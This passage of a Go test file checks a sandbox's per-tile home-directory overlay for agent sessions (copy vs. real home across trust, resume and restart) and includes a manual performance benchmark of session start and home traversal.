// on the copy and says so; a delegate's start for the person is too; a
// resume and a restart of a session that ran on the copy stay on it after
// the tile is trusted (their agent's own session files are in the copy),
// while a new session there has the real home.
func TestHomeCopyAgentSessions(t *testing.T) {
	h := newHomeLive(t)
	fake, bx, bins := homeBins(t)
	t.Setenv(agent.FakeEnv, fake+" --persist")
	h.m.BxPath = bx
	h.m.ExtraBinds = []sandbox.Bind{{Src: bins, Dst: bins, RO: true}}
	h.m.AgentPolicy = delegation.OpenPolicy{}
	home := h.seedHome(t, "alice")
	if err := os.MkdirAll(filepath.Join(home, ".claude"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, ".claude", "settings.json"), []byte(`{"real":"settings"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	before := treeHash(t, home)
	alice := h.who["alice"]

	// on bob's tile: the copy — it reads her real settings, and what the
	// agent keeps (its sessions, --persist) lands in the layer
	row := h.openAgent(t, alice, AgentOpen{Cwd: "apps/bob"})
	if row.Home == nil || row.Home.Mode != HomeCopy || row.Home.Trust == nil {
		t.Fatalf("the agent session's row: %+v", row.Home)
	}
	if evs := string(seen(t, h.m, row.ID)); !strings.Contains(evs, "Your home here is this tile's copy") {
		t.Fatalf("the agent session never said its home is a copy:\n%s", evs)
	}
	if said := agentSay(t, h.m, row.ID, "env"); !strings.Contains(said, "HOME="+home) || !strings.Contains(said, `{"real":"settings"}`) {
		t.Fatalf("the agent's view of the home: %q", said)
	}
	first := row.ID
	h.endAgent(t, first)
	h.idle(t, "alice")
	if after := treeHash(t, home); after != before {
		t.Fatalf("the agent session changed alice's real home:\n%s\n---\n%s", before, after)
	}
	layer, _ := h.m.homeCopyDir("alice", mustSource(t, h.tiles, "alice", "apps/bob"))
	if ents, _ := os.ReadDir(filepath.Join(layer, "upper", ".fakeacp", "sessions")); len(ents) == 0 {
		t.Fatal("the agent's own session files are not in the layer")
	}
	meta, _, err := h.m.historyMetaFrom(HistoryOf(alice), first)
	if err != nil || meta.Home != HomeCopy || !meta.Loadable {
		t.Fatalf("the past session's entry: %+v %v", meta, err)
	}

	// her workspace agent starts one for her there: the copy too
	t.Cleanup(auth.TestSealDelegate("xbin/wsagent"))
	alice.User.Tiles["xbin/wsagent"] = users.LevelTerminal
	delegate := auth.Principal{UserID: "alice", User: alice.User, Via: "delegate", Agent: "xbin/wsagent"}
	drow := h.openAgent(t, delegate, AgentOpen{Cwd: "apps/bob", Delegate: &DelegateStart{Approved: true, Provider: "fake", Mode: "ask"}})
	if drow.Home == nil || drow.Home.Mode != HomeCopy || drow.Home.Why != "" || drow.Home.Trust != nil || drow.Origin != "agent" {
		t.Fatalf("a delegate start's row: %+v origin %q", drow.Home, drow.Origin)
	}
	h.endAgent(t, drow.ID)

	// she trusts the tile: a NEW session has her real home…
	trustNow(t, h.store, h.tiles, "alice", "apps/bob")
	fresh := h.openAgent(t, alice, AgentOpen{Cwd: "apps/bob"})
	if fresh.Home.Mode != HomeOwn {
		t.Fatalf("a new session on a trusted tile: %+v", fresh.Home)
	}
	h.endAgent(t, fresh.ID)
	// …a RESUME of the one that ran on the copy stays on the copy, and finds its session there
	resumed := h.openAgent(t, alice, AgentOpen{Cwd: "apps/bob", Resume: first})
	if resumed.Home.Mode != HomeCopy || !resumed.Home.Kept {
		t.Fatalf("the resumed session's home: %+v", resumed.Home)
	}
	// …and a RESTART of it stays there too
	again, _, code, err := h.m.RestartAgentOnto(alice, resumed.ID, "none", "", true, nil, "")
	if err != nil || code != 200 {
		t.Fatalf("restart: %d %v", code, err)
	}
	if again.Home == nil || again.Home.Mode != HomeCopy || !again.Home.Kept {
		t.Fatalf("the restarted session's home: %+v", again.Home)
	}
	h.endAgent(t, again.ID)
	h.idle(t, "alice")
	// on her own tile a session's files are her real home's
	own := h.openAgent(t, alice, AgentOpen{Cwd: "apps/alice"})
	if own.Home.Mode != HomeOwn {
		t.Fatalf("her own tile: %+v", own.Home)
	}
	agentSay(t, h.m, own.ID, "env")
	h.endAgent(t, own.ID)
	if ents, _ := os.ReadDir(filepath.Join(home, ".fakeacp", "sessions")); len(ents) == 0 {
		t.Fatal("on her own tile the agent's session files are not in her real home")
	}
}

// TestHomeCopyPerf measures a session's start over a large home — the
// person's own (a bind, as before D245) against a tile's copy (the first
// session starts the layer's hold; a second one only asks it for a clone)
// — and prints the numbers. Not a pass/fail test: run it by hand with
// XBIN_HOME_PERF=<files>:<MiB> (the brief's 50000:1024).
func TestHomeCopyPerf(t *testing.T) {
	spec := os.Getenv("XBIN_HOME_PERF")
	if spec == "" {
		t.Skip("set XBIN_HOME_PERF=<files>:<MiB> to measure")
	}
	var files, mib int
	if _, err := fmt.Sscanf(spec, "%d:%d", &files, &mib); err != nil || files <= 0 || mib <= 0 {
		t.Fatalf("XBIN_HOME_PERF=%q: want <files>:<MiB>", spec)
	}
	h := newHomeLive(t)
	home := h.seedHome(t, "alice")
	// files spread over 500 directories; their sizes add up to mib
	each := make([]byte, mib<<20/files)
	for i := range each {
		each[i] = byte(i)
	}
	began := time.Now()
	for i := 0; i < files; i++ {
		dir := filepath.Join(home, "data", fmt.Sprintf("d%03d", i%500))
		if i < 500 {
			if err := os.MkdirAll(dir, 0o755); err != nil {
				t.Fatal(err)
			}
		}
		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("f%05d", i)), each, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	t.Logf("home: %d files, %d MiB (made in %v); overlay: %s", files, mib, time.Since(began).Round(time.Millisecond), map[bool]string{true: "fuse-overlayfs", false: "kernel"}[sandbox.FuseOverlayfs() != ""])
	// a start: from the socket's dial to the shell's first answer
	start := func(tile string) (time.Duration, *liveTerm) {
		t0 := time.Now()
		lt, why := h.openRaw(t, "alice", tile)
		if lt == nil {
			t.Fatalf("open on %s: %s", tile, why)
		}
		if _, ended := lt.run("true"); ended {
			t.Fatalf("the session on %s ended", tile)
		}
		return time.Since(t0), lt
	}
	median := func(tile string, n int) time.Duration {
		var ds []time.Duration
		for i := 0; i < n; i++ {
			d, lt := start(tile)
			lt.exit(h.m)
			h.idle(t, "alice")
			ds = append(ds, d)
		}
		sort.Slice(ds, func(i, j int) bool { return ds[i] < ds[j] })
		return ds[len(ds)/2]
	}
	const n = 7
	own := median("apps/alice", n)
	cold := median("apps/bob", n) // each starts and ends the layer's hold
	_, keep := start("apps/bob")  // …and with a session already on the layer
	var warm []time.Duration
	for i := 0; i < n; i++ {
		d, lt := start("apps/bob")
		lt.exit(h.m)
		warm = append(warm, d)
	}
	sort.Slice(warm, func(i, j int) bool { return warm[i] < warm[j] })
	t.Logf("session start, median of %d: real home (before, and on own tiles) %v; tile's copy, first session on it %v; tile's copy, a session already there %v",
		n, own.Round(time.Millisecond), cold.Round(time.Millisecond), warm[n/2].Round(time.Millisecond))
	// walking the whole home, and writing one of its files (a copy-up)
	walk := func(lt *liveTerm) time.Duration {
		t0 := time.Now()
		if _, ended := lt.run("find ~ -type f | wc -l"); ended {
			t.Fatal("the session ended during the walk")
		}
		return time.Since(t0)
	}
	w1, w2 := walk(keep), walk(keep)
	t0 := time.Now()
	keep.run("echo x >> ~/data/d000/f00000")
	up := time.Since(t0)
	keep.exit(h.m)
	h.idle(t, "alice")
	_, ownT := start("apps/alice")
	o1, o2 := walk(ownT), walk(ownT)
	ownT.exit(h.m)
	h.idle(t, "alice")
	t.Logf("find ~ -type f (%d files): real home %v then %v; tile's copy %v then %v; first write to a %d KiB file of the home on the copy %v",
		files, o1.Round(time.Millisecond), o2.Round(time.Millisecond), w1.Round(time.Millisecond), w2.Round(time.Millisecond), len(each)>>10, up.Round(time.Millisecond))
}
